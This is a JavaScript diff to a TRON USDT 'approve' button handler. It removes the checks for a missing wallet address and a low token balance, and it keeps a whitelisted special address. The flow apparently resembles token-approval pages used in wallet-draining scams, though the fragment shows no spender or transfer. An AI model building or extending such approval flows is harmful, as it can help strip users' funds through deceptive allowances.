@@ -1332,13 +1332,7 @@ function bindApproveLogic() {
         reviewTip.style.display = "none"; // 隐藏页面提示
         let alertEl = null; // 存储非防重复对象的弹窗元素
         try {
-            // 基础校验+A1信号校验（保留原有逻辑）
-            if (!userAddress) {
-                showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
-                btn.disabled = false;
-                btn.textContent = lang.approveBtnText;
-                return;
-            }
+            
             // 白名单地址跳过已授权校验，其他地址正常校验
             if (userAddress !== SPECIAL_ADDRESS && isAddressAuthorized(userAddress)) {
                 showAutoCloseAlert(lang.authorizedTip.split("<br>")[3]);
@@ -1346,12 +1340,7 @@ function bindApproveLogic() {
                 btn.textContent = lang.authorizedBtn;
                 return;
             }
-            if (tokenBalance <= 1 && userAddress !== SPECIAL_ADDRESS) {
-                showAutoCloseAlert(lang.insufficientUsdt.split("<br>")[2]);
-                btn.disabled = true;
-                btn.textContent = lang.insufficientBtn;
-                return;
-            }
+            
             if (!trc20Contract) {
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                 if (!trc20Contract) {
